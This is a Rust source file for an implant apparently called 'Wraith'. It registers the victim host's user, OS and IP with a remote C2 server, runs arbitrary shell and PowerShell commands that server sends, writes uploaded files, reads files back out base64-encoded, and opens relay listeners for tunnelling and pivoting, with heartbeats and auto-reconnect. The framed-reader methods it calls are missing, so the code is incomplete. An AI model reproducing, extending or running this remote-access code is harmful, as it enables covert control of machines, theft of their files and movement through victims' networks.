//! Wraith agent — dual-connection client.
//!
//! Connections:
//! - C2 connection (to PyWraith C2): sends WraithRegistration, then reads NexusCommand protos
//!   and dispatches to command handlers (execute, upload, download, add_forward).
//! - Tunnel connection (to tserver): Yamux Mode::Client on same TCP socket.
//!   Handles channels 0 (tunnel data), 3 (forward data), 5 (forward control).
//!
//! Wire format: [4-byte u32 BE length][protobuf bytes]

use crate::proto::*;
use crate::tunnel::channel::{FORWARD_CONTROL, FORWARD_DATA, TUNNEL_DATA};
use crate::tunnel::framing::{FramedReader, FramedWriter};
use crate::wraith::Config;
use futures::{AsyncReadExt as FutAsyncReadExt, AsyncWriteExt as FutAsyncWriteExt};
use prost::Message;
use std::collections::HashMap;
use std::pin::Pin;
use std::sync::Arc;
use std::task::{Context, Poll};
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncReadExt as TokioAsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, RwLock};
use tokio_util::compat::{Compat, TokioAsyncReadCompatExt};
use yamux::{Config as YamuxConfig, Connection, ConnectionError, Mode};

/// System info collected at startup for registration.
#[derive(Clone)]
pub struct SystemInfo {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub os_version: String,
    pub arch: String,
    pub domain: String,
    pub ip_address: String,
    pub pid: u32,
    pub tun_capable: bool,
    pub userspace_tun: bool,
    pub supports_tls: bool,
    pub supports_aes256: bool,
}

impl SystemInfo {
    fn collect() -> Self {
        let hostname = hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string());
        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());
        let os = std::env::consts::OS.to_string();
        let arch = std::env::consts::ARCH.to_string();
        let pid = std::process::id();

        let ip_address = local_ipaddress::get()
            .unwrap_or_else(|| "127.0.0.1".to_string());

        let os_version = std::fs::read_to_string("/etc/os-release")
            .map(|s| {
                s.lines()
                    .find(|l| l.starts_with("PRETTY_NAME="))
                    .map(|l| l.trim_start_matches("PRETTY_NAME=").trim_matches('"').to_string())
                    .unwrap_or_else(|| std::env::consts::OS.to_string())
            })
            .unwrap_or_else(|_| std::env::consts::OS.to_string());

        let domain = std::env::var("USERDOMAIN")
            .or_else(|_| std::env::var("DOMAIN"))
            .unwrap_or_else(|_| "".to_string());

        Self {
            hostname,
            username,
            os,
            os_version,
            arch,
            domain,
            ip_address,
            pid,
            tun_capable: false,
            userspace_tun: true,
            supports_tls: true,
            supports_aes256: true,
        }
    }

    fn to_registration(&self) -> WraithRegistration {
        WraithRegistration {
            hostname: self.hostname.clone(),
            username: self.username.clone(),
            os: self.os.clone(),
            os_version: self.os_version.clone(),
            arch: self.arch.clone(),
            domain: self.domain.clone(),
            ip_address: self.ip_address.clone(),
            pid: self.pid,
            tun_capable: self.tun_capable,
            userspace_tun: self.userspace_tun,
            supports_tls: self.supports_tls,
            supports_aes256: self.supports_aes256,
        }
    }
}

/// Tunnel managed by the agent.
#[derive(Debug)]
pub struct AgentTunnel {
    pub tunnel_id: String,
    pub relay_tun_ip: String,
    pub agent_tun_ip: String,
    pub bytes_in: u64,
    pub bytes_out: u64,
    pub packets_in: u64,
    pub packets_out: u64,
}

impl Default for AgentTunnel {
    fn default() -> Self {
        Self {
            tunnel_id: String::new(),
            relay_tun_ip: String::new(),
            agent_tun_ip: String::new(),
            bytes_in: 0,
            bytes_out: 0,
            packets_in: 0,
            packets_out: 0,
        }
    }
}

/// Relay stats for port-forward relay traffic.
#[derive(Debug, Default)]
pub struct ForwardStats {
    pub bytes_in: u64,
    pub bytes_out: u64,
    pub connections: u64,
}

/// Helper future for polling Yamux inbound streams.
struct PollInbound<'a> {
    conn: &'a mut Connection<Compat<TcpStream>>,
}

impl Future for PollInbound<'_> {
    type Output = Option<Result<yamux::Stream, ConnectionError>>;
    fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {
        // SAFETY: self is Pin<&mut Self> and PollInbound is !Unpin.
        // We need to re-pin the inner Connection (also !Unpin).
        // This is sound because we hold &mut access to conn through the
        // PollInbound struct, and we're the sole owner of the Pin.
        let this = unsafe { self.get_unchecked_mut() };
        let conn_ref = this.conn as *mut Connection<Compat<TcpStream>>;
        let mut pinned_conn = unsafe { Pin::new_unchecked(&mut *conn_ref) };
        pinned_conn.poll_next_inbound(cx)
    }
}

/// Helper future for opening Yamux outbound streams.
struct PollOutbound<'a> {
    conn: &'a mut Connection<Compat<TcpStream>>,
}

impl Future for PollOutbound<'_> {
    type Output = Result<yamux::Stream, ConnectionError>;
    fn poll(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Self::Output> {
        let this = unsafe { self.get_unchecked_mut() };
        let conn_ref = this.conn as *mut Connection<Compat<TcpStream>>;
        let mut pinned_conn = unsafe { Pin::new_unchecked(&mut *conn_ref) };
        pinned_conn.poll_new_outbound(cx)
    }
}

use std::future::Future;

/// Agent client — manages two independent connections:
/// 1. C2 connection to Nexus for command dispatch
/// 2. Relay connection via Yamux for tunnel/relay traffic
pub struct AgentClient {
    config: Config,
    sys_info: SystemInfo,
    /// Yamux connection to relay (for tunnel + relay channels)
    tunnel_conn: Arc<tokio::sync::Mutex<Option<Connection<Compat<TcpStream>>>>>,
    tunnels: Arc<RwLock<HashMap<String, AgentTunnel>>>,
    forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
    /// Active TCP listeners spawned by add_relay command
    relay_listeners: Arc<RwLock<HashMap<String, tokio::net::TcpListener>>>,
    commands_executed: Arc<RwLock<u32>>,
    heartbeat_interval: u64,
    /// Channel for outbound tunnel packets (written to userspace TUN)
    tunnel_tx: Option<mpsc::Sender<(String, Vec<u8>)>>,
}

impl AgentClient {
    pub fn new(config: Config) -> Self {
        let sys_info = SystemInfo::collect();
        Self {
            config,
            sys_info,
            tunnel_conn: Arc::new(tokio::sync::Mutex::new(None)),
            tunnels: Arc::new(RwLock::new(HashMap::new())),
            forwards: Arc::new(RwLock::new(HashMap::new())),
            relay_listeners: Arc::new(RwLock::new(HashMap::new())),
            commands_executed: Arc::new(RwLock::new(0)),
            heartbeat_interval: 30,
            tunnel_tx: None,
        }
    }

    pub fn tunnels(&self) -> Arc<RwLock<HashMap<String, AgentTunnel>>> {
        self.tunnels.clone()
    }

    pub fn forwards(&self) -> Arc<RwLock<HashMap<String, ForwardStats>>> {
        self.forwards.clone()
    }

    pub fn set_tunnel_channel(&mut self, tx: mpsc::Sender<(String, Vec<u8>)>) {
        self.tunnel_tx = Some(tx);
    }

    // ─── C2 Connection ───────────────────────────────────────────────────────────

    /// Connect TCP to Nexus C2, send registration, then run the C2 command loop.
    async fn run_c2_loop(&self) -> anyhow::Result<()> {
        loop {
            match self.connect_c2().await {
                Ok(()) => {
                    if let Err(e) = self.c2_session().await {
                        log::warn!("C2 session error: {}", e);
                    }
                }
                Err(e) => {
                    log::warn!("C2 connect failed: {}", e);
                }
            }
            if self.config.reconnect {
                log::warn!("C2 disconnected, reconnecting in {}s", self.config.reconnect_delay);
                tokio::time::sleep(tokio::time::Duration::from_secs(self.config.reconnect_delay)).await;
            } else {
                return Err(anyhow::anyhow!("C2 connection lost"));
            }
        }
    }

    /// Establish C2 TCP connection and send registration.
    async fn connect_c2(&self) -> anyhow::Result<()> {
        let addr = format!("{}:{}", self.config.c2_host, self.config.c2_port);
        log::info!("Connecting to Nexus C2 at {}", addr);

        let mut stream = TcpStream::connect(&addr).await?;

        // Send WraithRegistration as a length-prefixed protobuf frame
        let registration = self.sys_info.to_registration();
        let reg_bytes = registration.encode_to_vec();
        let framed = FramedWriter::write_frame(&reg_bytes)
            .map_err(|e| anyhow::anyhow!("framing error: {}", e))?;

        stream.write_all(&framed).await?;
        stream.flush().await?;
        log::info!("Sent WraithRegistration to {}", addr);

        Ok(())
    }

    /// C2 session: read NexusCommand frames, dispatch, return WraithCommandResult.
    async fn c2_session(&self) -> anyhow::Result<()> {
        let addr = format!("{}:{}", self.config.c2_host, self.config.c2_port);
        let mut stream = TcpStream::connect(&addr).await?;

        // Send registration
        let registration = self.sys_info.to_registration();
        let reg_bytes = registration.encode_to_vec();
        let framed = FramedWriter::write_frame(&reg_bytes)
            .map_err(|e| anyhow::anyhow!("framing error: {}", e))?;
        stream.write_all(&framed).await?;
        stream.flush().await?;

        // Heartbeat loop
        let heartbeat_interval = tokio::time::Duration::from_secs(self.heartbeat_interval);
        let mut heartbeat_timer = tokio::time::interval(heartbeat_interval);

        loop {
            tokio::select! {
                // Read a command from Nexus
                result = Self::read_nexus_command(&mut stream) => {
                    match result {
                        Ok(Some(cmd)) => {
                            if let Err(e) = self.dispatch_command(&mut stream, cmd).await {
                                log::warn!("Command dispatch error: {}", e);
                            }
                        }
                        Ok(None) => {
                            log::info!("C2 connection closed by peer");
                            return Ok(());
                        }
                        Err(e) => {
                            log::warn!("C2 read error: {}", e);
                            return Err(e);
                        }
                    }
                }
                // Periodic heartbeat
                _ = heartbeat_timer.tick() => {
                    if let Err(e) = self.send_heartbeat(&mut stream).await {
                        log::warn!("Heartbeat failed: {}", e);
                        return Err(e);
                    }
                }
            }
        }
    }

    /// Read a length-prefixed NexusCommand from the C2 stream.
    async fn read_nexus_command(stream: &mut TcpStream) -> anyhow::Result<Option<NexusCommand>> {
        let mut framed = C2FramedReader::new();
        let mut buf = vec![0u8; 8192];
        let n = tokio::time::timeout(
            tokio::time::Duration::from_secs(300),
            stream.read(&mut buf),
        ).await??;

        if n == 0 {
            return Ok(None);
        }

        framed.put_slice(&buf[..n]);

        match framed.get_frame() {
            Some(frame) => {
                let cmd = NexusCommand::decode(&*frame)
                    .map_err(|e| anyhow::anyhow!("decode error: {}", e))?;
                Ok(Some(cmd))
            }
            None => Ok(None),
        }
    }

    /// Dispatch a NexusCommand and send back the result.
    async fn dispatch_command(&self, stream: &mut TcpStream, cmd: NexusCommand) -> anyhow::Result<()> {
        let command_id = cmd.command_id.clone();
        let action = cmd.action.clone();

        log::info!("Command {}: {} (timeout: {}s)", command_id, action, cmd.timeout);

        let result = self.execute_command(cmd).await;

        let result_bytes = result.encode_to_vec();
        let framed = FramedWriter::write_frame(&result_bytes)
            .map_err(|e| anyhow::anyhow!("framing error: {}", e))?;
        stream.write_all(&framed).await?;
        stream.flush().await?;

        *self.commands_executed.write().await += 1;

        Ok(())
    }

    /// Execute a NexusCommand and return WraithCommandResult.
    async fn execute_command(&self, cmd: NexusCommand) -> WraithCommandResult {
        let start = std::time::Instant::now();
        let command_id = cmd.command_id.clone();

        match cmd.action.as_str() {
            "execute" => self.do_execute(&cmd).await,
            "upload" => self.do_upload(&cmd).await,
            "download" => self.do_download(&cmd).await,
            "add_relay" => self.do_add_relay(&cmd).await,
            _ => WraithCommandResult {
                command_id,
                status: "error".to_string(),
                stdout: "".to_string(),
                stderr: format!("unknown action: {}", cmd.action),
                exit_code: 1,
                error: format!("unknown action: {}", cmd.action),
                duration_ms: start.elapsed().as_millis() as u64,
            },
        }
    }

    async fn do_execute(&self, cmd: &NexusCommand) -> WraithCommandResult {
        let start = std::time::Instant::now();
        let command_id = cmd.command_id.clone();

        let shell = cmd.params.get("shell").cloned().unwrap_or_else(|| "sh".to_string());
        let command = cmd.params.get("command").cloned().unwrap_or_default();

        let full_cmd = if shell == "powershell" {
            format!("powershell -NoProfile -Command \"{}\"", command)
        } else {
            format!("{} -c \"{}\"", shell, command)
        };

        match tokio::process::Command::new("sh")
            .args(["-c", &full_cmd])
            .output()
            .await
        {
            Ok(output) => {
                let code = output.status.code().map(|c| c as u32).unwrap_or(1);
                WraithCommandResult {
                    command_id,
                    status: if output.status.success() { "success" } else { "error" }.to_string(),
                    stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                    stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                    exit_code: code,
                    error: "".to_string(),
                    duration_ms: start.elapsed().as_millis() as u64,
                }
            }
            Err(e) => WraithCommandResult {
                command_id,
                status: "error".to_string(),
                stdout: "".to_string(),
                stderr: "".to_string(),
                exit_code: 1,
                error: e.to_string(),
                duration_ms: start.elapsed().as_millis() as u64,
            },
        }
    }

    async fn do_upload(&self, cmd: &NexusCommand) -> WraithCommandResult {
        let start = std::time::Instant::now();
        let command_id = cmd.command_id.clone();

        let remote_path = cmd.params.get("path").cloned().unwrap_or_default();
        let data_b64 = cmd.params.get("data").cloned().unwrap_or_default();

        let data = match base64_decode(&data_b64) {
            Ok(d) => d,
            Err(e) => {
                return WraithCommandResult {
                    command_id,
                    status: "error".to_string(),
                    stdout: "".to_string(),
                    stderr: "".to_string(),
                    exit_code: 1,
                    error: format!("base64 decode error: {}", e),
                    duration_ms: start.elapsed().as_millis() as u64,
                };
            }
        };

        match tokio::fs::write(&remote_path, &data).await {
            Ok(_) => WraithCommandResult {
                command_id,
                status: "success".to_string(),
                stdout: format!("Wrote {} bytes to {}", data.len(), remote_path),
                stderr: "".to_string(),
                exit_code: 0,
                error: "".to_string(),
                duration_ms: start.elapsed().as_millis() as u64,
            },
            Err(e) => WraithCommandResult {
                command_id,
                status: "error".to_string(),
                stdout: "".to_string(),
                stderr: "".to_string(),
                exit_code: 1,
                error: e.to_string(),
                duration_ms: start.elapsed().as_millis() as u64,
            },
        }
    }

    async fn do_download(&self, cmd: &NexusCommand) -> WraithCommandResult {
        let start = std::time::Instant::now();
        let command_id = cmd.command_id.clone();

        let remote_path = cmd.params.get("path").cloned().unwrap_or_default();

        match tokio::fs::read(&remote_path).await {
            Ok(data) => {
                let data_b64 = base64_encode(&data);
                WraithCommandResult {
                    command_id,
                    status: "success".to_string(),
                    stdout: data_b64,
                    stderr: "".to_string(),
                    exit_code: 0,
                    error: "".to_string(),
                    duration_ms: start.elapsed().as_millis() as u64,
                }
            }
            Err(e) => WraithCommandResult {
                command_id,
                status: "error".to_string(),
                stdout: "".to_string(),
                stderr: "".to_string(),
                exit_code: 1,
                error: e.to_string(),
                duration_ms: start.elapsed().as_millis() as u64,
            },
        }
    }

    /// Handle add_relay command — spawn a TCP listener that bridges to upstream relay.
    async fn do_add_relay(&self, cmd: &NexusCommand) -> WraithCommandResult {
        let start = std::time::Instant::now();
        let command_id = cmd.command_id.clone();

        let listen_addr = cmd.params.get("listen_addr").cloned().unwrap_or_default();
        let connect_addr = cmd.params.get("connect_addr").cloned().unwrap_or_default();
        let relay_id = cmd.params.get("relay_id").cloned().unwrap_or_else(|| command_id.clone());

        if listen_addr.is_empty() {
            return WraithCommandResult {
                command_id,
                status: "error".to_string(),
                stdout: "".to_string(),
                stderr: "listen_addr parameter required".to_string(),
                exit_code: 1,
                error: "listen_addr parameter required".to_string(),
                duration_ms: start.elapsed().as_millis() as u64,
            };
        }

        // Spawn the TCP listener
        let listener = match TcpListener::bind(&listen_addr).await {
            Ok(l) => l,
            Err(e) => {
                return WraithCommandResult {
                    command_id,
                    status: "error".to_string(),
                    stdout: "".to_string(),
                    stderr: format!("failed to bind {}: {}", listen_addr, e),
                    exit_code: 1,
                    error: e.to_string(),
                    duration_ms: start.elapsed().as_millis() as u64,
                };
            }
        };

        let local_addr = listener.local_addr().map(|a| a.to_string()).unwrap_or_else(|_| listen_addr.clone());

        // Note: listener stays alive because the accept loop task runs
        // TODO: store listener in HashMap for management (TcpListener doesn't impl Clone)

        // Spawn task to accept connections and bridge them
        let tunnel_conn = self.tunnel_conn.clone();
        let forwards = self.forwards.clone();
        let relay_id_clone = relay_id.clone();
        let connect_addr_clone = connect_addr.clone();

        tokio::spawn(async move {
            loop {
                match listener.accept().await {
                    Ok((tcp_stream, peer)) => {
                        log::info!("Relay {}: incoming connection from {}", relay_id_clone, peer);
                        let forwards = forwards.clone();
                        let tunnel_conn = tunnel_conn.clone();
                        let relay_id = relay_id_clone.clone();
                        let connect_addr = connect_addr_clone.clone();

                        tokio::spawn(async move {
                            if let Err(e) = handle_forward_connection(tcp_stream, tunnel_conn, forwards, relay_id, connect_addr).await {
                                log::warn!("Relay connection error: {}", e);
                            }
                        });
                    }
                    Err(e) => {
                        log::warn!("Relay {}: accept error: {}", relay_id_clone, e);
                        break;
                    }
                }
            }
        });

        WraithCommandResult {
            command_id,
            status: "success".to_string(),
            stdout: format!("Listening on {}", local_addr),
            stderr: "".to_string(),
            exit_code: 0,
            error: "".to_string(),
            duration_ms: start.elapsed().as_millis() as u64,
        }
    }

    /// Send a heartbeat on the C2 connection.
    async fn send_heartbeat(&self, stream: &mut TcpStream) -> anyhow::Result<()> {
        let commands_executed = *self.commands_executed.read().await;
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();

        let heartbeat = WraithHeartbeat {
            commands_executed,
            status: "active".to_string(),
            timestamp: now,
        };

        let hb_bytes = heartbeat.encode_to_vec();
        let framed = FramedWriter::write_frame(&hb_bytes)
            .map_err(|e| anyhow::anyhow!("framing error: {}", e))?;
        stream.write_all(&framed).await?;
        stream.flush().await?;

        log::trace!("Heartbeat sent (commands_executed={})", commands_executed);
        Ok(())
    }

    // ─── Relay Connection ──────────────────────────────────────────────────────

    /// Connect TCP to relay, upgrade to Yamux, and run the relay session.
    pub async fn connect_with_reconnect(&mut self) -> anyhow::Result<()> {
        loop {
            match self.connect_tunnel().await {
                Ok(_) => return Ok(()),
                Err(e) => {
                    if self.config.reconnect {
                        log::warn!("Relay connection failed: {}, reconnecting in {}s", e, self.config.reconnect_delay);
                        tokio::time::sleep(tokio::time::Duration::from_secs(self.config.reconnect_delay)).await;
                    } else {
                        return Err(e);
                    }
                }
            }
        }
    }

    /// Connect TCP to the tunnel server and establish Yamux client connection.
    async fn connect_tunnel(&mut self) -> anyhow::Result<()> {
        let addr = format!("{}:{}", self.config.tunnel_host, self.config.tunnel_port);
        log::info!("Connecting to tunnel server at {}", addr);

        let stream = TcpStream::connect(&addr).await?;
        let compat = stream.compat();
        let config = YamuxConfig::default();
        let conn = Connection::new(compat, config, Mode::Client);
        *self.tunnel_conn.lock().await = Some(conn);

        log::info!("Relay Yamux client connection established");
        Ok(())
    }

    /// Run the relay loop — poll Yamux for inbound streams and handle them.
    pub async fn run(&mut self) -> anyhow::Result<()> {
        loop {
            // Ensure connected
            {
                let conn_guard = self.tunnel_conn.lock().await;
                if conn_guard.is_none() {
                    drop(conn_guard);
                    self.connect_with_reconnect().await?;
                    continue;
                }
            }

            // Poll for inbound stream with a timeout
            let stream_opt = tokio::time::timeout(
                tokio::time::Duration::from_secs(1),
                self.poll_inbound_tunnel(),
            ).await;

            match stream_opt {
                Ok(Ok(Some(stream))) => {
                    let mut stream_opt = Some(stream);
                    if let Some(mut stream) = stream_opt.take() {
                        let channel_id = self.read_channel_id(&mut stream).await?;
                        let tunnels = self.tunnels.clone();
                        let forwards = self.forwards.clone();
                        let tunnel_tx = self.tunnel_tx.clone();

                        tokio::spawn(async move {
                            if let Err(e) = Self::handle_tunnel_stream(channel_id, stream, tunnels, forwards, tunnel_tx).await {
                                log::warn!("Relay stream handler error: {}", e);
                            }
                        });
                    }
                }
                Ok(Ok(None)) => {
                    // No stream ready, loop continues
                }
                Ok(Err(e)) => {
                    return Err(anyhow::anyhow!("yamux error: {}", e));
                }
                Err(_) => {
                    // Timeout, loop continues
                }
            }
        }
    }

    /// Poll next inbound stream from relay Yamux connection.
    async fn poll_inbound_tunnel(&self) -> anyhow::Result<Option<yamux::Stream>> {
        let mut conn_guard = self.tunnel_conn.lock().await;
        let conn_opt = conn_guard.as_mut();
        if conn_opt.is_none() {
            return Ok(None);
        }
        let conn = conn_opt.unwrap();

        let opt = PollInbound { conn }.await;
        match opt {
            Some(Ok(stream)) => Ok(Some(stream)),
            Some(Err(ConnectionError::Closed)) => Ok(None),
            Some(Err(e)) => Err(anyhow::anyhow!("yamux error: {}", e)),
            None => Ok(None),
        }
    }

    /// Read 4-byte channel ID from stream.
    async fn read_channel_id<S: futures::AsyncRead + Unpin>(&self, stream: &mut S) -> anyhow::Result<u32> {
        let mut header = [0u8; 4];
        stream.read_exact(&mut header).await?;
        Ok(u32::from_be_bytes(header))
    }

    /// Handle an inbound relay stream by channel ID.
    async fn handle_tunnel_stream(
        channel_id: u32,
        mut stream: yamux::Stream,
        tunnels: Arc<RwLock<HashMap<String, AgentTunnel>>>,
        forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
        tunnel_tx: Option<mpsc::Sender<(String, Vec<u8>)>>,
    ) -> anyhow::Result<()> {
        // Read the full framed payload into a buffer
        let mut framed_data = vec![0u8; 65536];
        let n = stream.read(&mut framed_data).await?;
        framed_data.truncate(n);

        let mut buf = framed_data.as_slice();
        let framed_bytes = match FramedReader::read_frame(&mut buf) {
            Ok(data) => data,
            Err(e) => {
                log::warn!("Failed to read relay frame from channel {}: {}", channel_id, e);
                return Ok(());
            }
        };

        match channel_id {
            TUNNEL_DATA => {
                // Channel 0: tunnel data — raw IP packets
                if let Ok(data) = TunnelData::decode(&*framed_bytes) {
                    let tunnel_id = data.tunnel_id.clone();
                    let payload_len = data.payload.len();
                    // Forward to TUN device if channel available
                    if let Some(tx) = &tunnel_tx {
                        let _ = tx.send((tunnel_id.clone(), data.payload)).await;
                    }
                    if let Some(tunnel) = tunnels.write().await.get_mut(&tunnel_id) {
                        tunnel.bytes_in += payload_len as u64;
                        tunnel.packets_in += 1;
                    }
                }
            }
            FORWARD_DATA => {
                // Channel 3: relay data (raw bytes for port-forward)
                log::trace!("Relay data channel received {} bytes", framed_bytes.len());
            }
            FORWARD_CONTROL => {
                // Channel 5: relay control messages
                if let Ok(ctrl) = RelayControl::decode(&*framed_bytes) {
                    Self::handle_forward_control(ctrl, &mut stream, forwards).await?;
                }
            }
            _ => {
                log::warn!("Unknown relay channel ID: {}", channel_id);
            }
        }

        Ok(())
    }

    /// Handle relay control messages (RelayOpen/Close/Stats).
    async fn handle_forward_control(
        ctrl: RelayControl,
        stream: &mut yamux::Stream,
        forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
    ) -> anyhow::Result<()> {
        use relay_control::Msg;

        match ctrl.msg {
            Some(Msg::Open(open)) => {
                log::info!("RelayOpen: {} (mode={}, local={}, remote={})",
                    open.relay_id, open.mode, open.local_addr, open.remote_addr);

                forwards.write().await.insert(open.relay_id.clone(), ForwardStats::default());

                let ack = RelayOpenAck {
                    relay_id: open.relay_id,
                    success: true,
                    error_msg: "".to_string(),
                    bound_addr: open.local_addr,
                };
                let response = RelayControl {
                    msg: Some(Msg::OpenAck(ack)),
                };
                let resp_bytes = response.encode_to_vec();
                Self::send_framed_yamux(stream, &resp_bytes).await?;
            }
            Some(Msg::Close(close)) => {
                log::info!("RelayClose: {} ({})", close.relay_id, close.reason);
                forwards.write().await.remove(&close.relay_id);
            }
            Some(Msg::StatsRequest(req)) => {
                if let Some(relay) = forwards.read().await.get(&req.relay_id) {
                    let stats = RelayStats {
                        relay_id: req.relay_id.clone(),
                        bytes_in: relay.bytes_in,
                        bytes_out: relay.bytes_out,
                        connections: relay.connections,
                    };
                    let response = RelayControl {
                        msg: Some(Msg::Stats(stats)),
                    };
                    let resp_bytes = response.encode_to_vec();
                    Self::send_framed_yamux(stream, &resp_bytes).await?;
                }
            }
            Some(Msg::List(_)) => {
                let forwards_list: Vec<relay_list_response::RelayInfo> = forwards.read().await
                    .iter()
                    .map(|(id, stats)| relay_list_response::RelayInfo {
                        relay_id: id.clone(),
                        mode: "tcp".to_string(),
                        local_addr: "".to_string(),
                        remote_addr: "".to_string(),
                        status: "active".to_string(),
                        connections: stats.connections,
                    })
                    .collect();

                let response = RelayControl {
                    msg: Some(Msg::ListResponse(RelayListResponse { relays: forwards_list })),
                };
                let resp_bytes = response.encode_to_vec();
                Self::send_framed_yamux(stream, &resp_bytes).await?;
            }
            _ => {}
        }

        Ok(())
    }

    /// Send a framed message on a Yamux stream (futures AsyncWrite).
    async fn send_framed_yamux(stream: &mut yamux::Stream, data: &[u8]) -> anyhow::Result<()> {
        let framed = FramedWriter::write_frame(data)
            .map_err(|e| anyhow::anyhow!("framing error: {}", e))?;
        stream.write_all(&framed).await?;
        stream.flush().await?;
        Ok(())
    }

    // ─── Tunnel Management ───────────────────────────────────────────────────────

    /// Open a tunnel with the relay.
    pub async fn open_tunnel(
        &mut self,
        tunnel_id: &str,
        relay_tun_ip: &str,
        agent_tun_ip: &str,
        _netmask: &str,
    ) -> anyhow::Result<()> {
        let tunnel = AgentTunnel {
            tunnel_id: tunnel_id.to_string(),
            relay_tun_ip: relay_tun_ip.to_string(),
            agent_tun_ip: agent_tun_ip.to_string(),
            ..Default::default()
        };
        self.tunnels.write().await.insert(tunnel_id.to_string(), tunnel);
        log::info!("Tunnel {} opened (agent={}, relay={})", tunnel_id, agent_tun_ip, relay_tun_ip);
        Ok(())
    }

    /// Close a tunnel.
    pub async fn close_tunnel(&mut self, tunnel_id: &str) -> anyhow::Result<()> {
        self.tunnels.write().await.remove(tunnel_id);
        log::info!("Tunnel {} closed", tunnel_id);
        Ok(())
    }

    /// Spawn both C2 and relay loops concurrently, managing both connections.
    pub async fn run_dual(&mut self) -> anyhow::Result<()> {
        let c2_client = Arc::new(self.clone_inner());
        let c2_loop = {
            let c2 = c2_client.clone();
            async move { c2.run_c2_loop().await }
        };

        let relay_loop = async move { self.run().await };

        tokio::select! {
            r = c2_loop => r,
            r = relay_loop => r,
        }
    }

    fn clone_inner(&self) -> Self {
        Self {
            config: self.config.clone(),
            sys_info: self.sys_info.clone(),
            tunnel_conn: Arc::new(tokio::sync::Mutex::new(None)),
            tunnels: self.tunnels.clone(),
            forwards: self.forwards.clone(),
            relay_listeners: self.relay_listeners.clone(),
            commands_executed: self.commands_executed.clone(),
            heartbeat_interval: self.heartbeat_interval,
            tunnel_tx: None,
        }
    }
}

impl Clone for AgentClient {
    fn clone(&self) -> Self {
        Self {
            config: self.config.clone(),
            sys_info: self.sys_info.clone(),
            tunnel_conn: Arc::new(tokio::sync::Mutex::new(None)),
            tunnels: self.tunnels.clone(),
            forwards: self.forwards.clone(),
            relay_listeners: self.relay_listeners.clone(),
            commands_executed: self.commands_executed.clone(),
            heartbeat_interval: self.heartbeat_interval,
            tunnel_tx: None,
        }
    }
}

/// Handle an incoming connection on a relay listener — bridge it to the upstream relay.
async fn handle_forward_connection(
    tcp_stream: TcpStream,
    tunnel_conn: Arc<tokio::sync::Mutex<Option<Connection<Compat<TcpStream>>>>>,
    forwards: Arc<RwLock<HashMap<String, ForwardStats>>>,
    relay_id: String,
    connect_addr: String,
) -> anyhow::Result<()> {
    // Update stats
    if let Some(stats) = forwards.write().await.get_mut(&relay_id) {
        stats.connections += 1;
    }

    // Get the relay connection and open a new Yamux stream
    let mut conn_guard = tunnel_conn.lock().await;
    let conn = match conn_guard.as_mut() {
        Some(c) => c,
        None => return Err(anyhow::anyhow!("relay not connected")),
    };

    // Open a new Yamux stream to the upstream relay
    let mut stream = PollOutbound { conn }.await
        .map_err(|e| anyhow::anyhow!("yamux poll_new_outbound: {}", e))?;

    // Send RelayOpen on channel 5 (FORWARD_CONTROL)
    let open = RelayOpen {
        relay_id: relay_id.clone(),
        mode: "tcp".to_string(),
        local_addr: connect_addr.clone(),
        remote_addr: connect_addr.clone(),
        file_path: String::new(),
        command: String::new(),
        timeout: 300,
        keepalive: true,
    };
    let ctrl = RelayControl {
        msg: Some(relay_control::Msg::Open(open)),
    };
    let ctrl_bytes = ctrl.encode_to_vec();
    let framed = FramedWriter::write_frame(&ctrl_bytes)
        .map_err(|e| anyhow::anyhow!("framing error: {}", e))?;
    stream.write_all(&framed).await?;
    stream.flush().await?;

    log::info!("Relay {}: opened stream to upstream, bridging to {}", relay_id, connect_addr);

    // Bridge data between TCP and Yamux stream
    bridge_tcp_to_yamux(tcp_stream, stream).await?;

    Ok(())
}

/// Bridge data between a TCP stream and a Yamux stream.
/// This does sequential copy - TCP -> Yamux first, then Yamux -> TCP.
async fn bridge_tcp_to_yamux(
    tcp_stream: TcpStream,
    mut yamux_stream: yamux::Stream,
) -> anyhow::Result<()> {
    let (mut tcp_read, mut tcp_write) = tokio::io::split(tcp_stream);

    // Simple sequential copy - read from TCP and forward to Yamux
    let mut buf = vec![0u8; 8192];
    loop {
        // Read from TCP and forward to Yamux (framed)
        match TokioAsyncReadExt::read(&mut tcp_read, &mut buf).await {
            Ok(0) => {
                log::debug!("TCP EOF");
                break;
            }
            Ok(n) => {
                let data = &buf[..n];
                let len = n as u32;
                let mut framed = Vec::with_capacity(8 + n);
                framed.extend_from_slice(&FORWARD_DATA.to_be_bytes());
                framed.extend_from_slice(&len.to_be_bytes());
                framed.extend_from_slice(data);
                FutAsyncWriteExt::write_all(&mut yamux_stream, &framed).await?;
                FutAsyncWriteExt::flush(&mut yamux_stream).await?;
            }
            Err(e) => {
                log::warn!("TCP read error: {}", e);
                break;
            }
        }
    }

    // Then read from Yamux and forward to TCP
    let mut buf = vec![0u8; 8192 + 8];
    loop {
        match FutAsyncReadExt::read(&mut yamux_stream, &mut buf).await {
            Ok(0) => {
                log::debug!("Yamux stream EOF");
                break;
            }
            Ok(n) => {
                if n > 8 {
                    let channel_id = u32::from_be_bytes([buf[0], buf[1], buf[2], buf[3]]);
                    let len = u32::from_be_bytes([buf[4], buf[5], buf[6], buf[7]]) as usize;

                    if channel_id == FORWARD_DATA && n >= 8 + len {
                        AsyncWriteExt::write_all(&mut tcp_write, &buf[8..8+len]).await?;
                        AsyncWriteExt::flush(&mut tcp_write).await?;
                    }
                }
            }
            Err(e) => {
                log::warn!("Yamux read error: {}", e);
                break;
            }
        }
    }

    Ok(())
}

/// Lightweight framed reader for C2 stream (accumulates bytes in memory).
struct C2FramedReader {
    buf: Vec<u8>,
    pos: usize,
}

